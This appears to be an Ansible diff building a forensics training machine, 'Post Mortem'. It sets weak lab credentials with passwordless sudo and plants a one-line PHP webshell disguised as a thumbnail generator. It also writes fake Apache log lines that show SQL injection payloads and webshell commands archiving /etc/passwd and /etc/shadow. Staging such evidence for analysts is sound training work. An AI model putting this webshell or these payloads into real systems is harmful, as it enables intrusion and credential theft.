@@ -1,0 +1,74 @@
+---
+# for-t2 "Post Mortem" — a compromised web server: planted SQLi trail in
+# access.log, webshell in uploads/, loot staging in /tmp/.loot.
+- name: packages
+  ansible.builtin.apt:
+    name: [apache2, openssh-server]
+    state: present
+    update_cache: true
+
+- name: analyst account + sudo
+  ansible.builtin.user:
+    name: analyst
+    password: "{{ 'analysis' | password_hash('sha512') }}"
+    shell: /bin/bash
+    home: /home/analyst
+    create_home: true
+
+- name: analyst sudoers
+  ansible.builtin.copy:
+    dest: /etc/sudoers.d/90-analyst
+    content: "analyst ALL=(root) NOPASSWD: ALL\n"
+    mode: "0440"
+    validate: visudo -cf %s
+
+- name: ssh password auth
+  ansible.builtin.lineinfile:
+    path: /etc/ssh/sshd_config
+    regexp: "^#?PasswordAuthentication"
+    line: "PasswordAuthentication yes"
+  notify: restart sshd
+
+- name: upload dir (webshell + flag live here)
+  ansible.builtin.file:
+    path: /var/www/html/uploads
+    state: directory
+    owner: www-data
+    mode: "0755"
+
+- name: plant webshell
+  ansible.builtin.copy:
+    dest: /var/www/html/uploads/x.php
+    content: "<?php /* cached thumb gen */ system($_GET['c']); ?>\n"
+    owner: www-data
+    mode: "0644"
+
+- name: loot staging dir (exfil flag lands here post-deploy)
+  ansible.builtin.file:
+    path: /tmp/.loot
+    state: directory
+    mode: "0755"
+
+- name: loot tarball + notes
+  ansible.builtin.copy:
+    dest: "/tmp/.loot/{{ item.dest }}"
+    content: "{{ item.content }}"
+    mode: "{{ item.mode | default('0644') }}"
+  loop:
+    - { dest: notes.txt, content: "stage: product.php?id= sqli -> upload -> tar\ntodo: exfil then wipe\n" }
+    - { dest: loot.tgz, content: "PK-FAKE-ARCHIVE etc-passwd-shadow-snippet\n" }
+
+- name: plant the attack in access.log
+  ansible.builtin.blockinfile:
+    path: /var/log/apache2/access.log
+    marker: "# {mark} PENTRAIN FOR-T2 EVIDENCE"
+    block: |
+      10.66.6.6 - - [15/Mar/2025:02:14:11 +0000] "GET /product.php?id=3%27 HTTP/1.1" 500 812 "-" "Mozilla/5.0"
+      10.66.6.6 - - [15/Mar/2025:02:14:29 +0000] "GET /product.php?id=3%20UNION%20SELECT%20NULL-- HTTP/1.1" 500 812 "-" "Mozilla/5.0"
+      10.66.6.6 - - [15/Mar/2025:02:15:02 +0000] "GET /product.php?id=3%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- HTTP/1.1" 200 4410 "-" "Mozilla/5.0"
+      10.66.6.6 - - [15/Mar/2025:02:15:40 +0000] "GET /product.php?id=3%20UNION%20SELECT%20GROUP_CONCAT(user,0x3a,password)%20FROM%20mysql.user-- HTTP/1.1" 200 4612 "-" "Mozilla/5.0"
+      10.66.6.6 - - [15/Mar/2025:02:17:03 +0000] "POST /upload.php HTTP/1.1" 200 228 "-" "Mozilla/5.0"
+      10.66.6.6 - - [15/Mar/2025:02:17:21 +0000] "GET /uploads/x.php?c=id HTTP/1.1" 200 90 "-" "Mozilla/5.0"
+      10.66.6.6 - - [15/Mar/2025:02:17:55 +0000] "GET /uploads/x.php?c=tar%20czf%20/tmp/.loot/loot.tgz%20/etc/passwd%20/etc/shadow%20flag.txt HTTP/1.1" 200 64 "-" "Mozilla/5.0"
+      10.66.6.6 - - [15/Mar/2025:02:18:30 +0000] "GET /uploads/x.php?c=ls%20-la%20/tmp/.loot/ HTTP/1.1" 200 190 "-" "Mozilla/5.0"
+    create: true
